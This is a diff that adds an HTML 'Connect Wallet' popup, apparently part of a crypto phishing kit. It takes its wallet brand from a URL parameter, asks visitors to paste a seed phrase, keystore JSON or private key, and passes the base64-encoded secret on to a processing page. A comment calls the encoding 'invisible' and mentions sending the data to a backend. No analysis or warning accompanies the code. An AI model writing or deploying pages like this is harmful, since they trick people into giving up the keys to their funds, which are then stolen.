@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connect Wallet</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="wallet-body">
+
+  <div class="popup-overlay">
+    <div class="popup-box">
+      <div class="popup-header">
+        <img id="wallet-logo" src="" alt="Wallet Logo" />
+        <h2 id="wallet-name">Wallet Name</h2>
+      </div>
+
+      <label for="method-select">Choose Import Method:</label>
+      <select id="method-select">
+        <option value="phrase">Phrase</option>
+        <option value="keystore">Keystore JSON</option>
+        <option value="privatekey">Private Key</option>
+      </select>
+
+      <textarea id="wallet-input" placeholder="Enter your wallet phrase"></textarea>
+
+      <div class="popup-buttons">
+        <button class="validate-btn" onclick="submitWallet()">Validate</button>
+        <button class="close-btn" onclick="window.location.href='index.html'">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const walletName = params.get('wallet') || 'Wallet';
+    document.getElementById('wallet-name').textContent = walletName;
+    document.getElementById('wallet-logo').src = `images/logos/${walletName.toLowerCase().replace(/\s/g, '')}.png`;
+
+    document.getElementById('method-select').addEventListener('change', () => {
+      const input = document.getElementById('wallet-input');
+      const type = document.getElementById('method-select').value;
+      input.placeholder = `Enter your ${type.replace('keystore', 'Keystore JSON')}`;
+    });
+
+    function submitWallet() {
+      const input = document.getElementById('wallet-input').value;
+      const method = document.getElementById('method-select').value;
+
+      // Encode the data invisibly in the URL (or send to a backend in real apps)
+      const encoded = encodeURIComponent(btoa(`${method}:::${input}`));
+
+      window.location.href = `processing.html?data=${encoded}`;
+    }
+  </script>
+</body>
+</html>
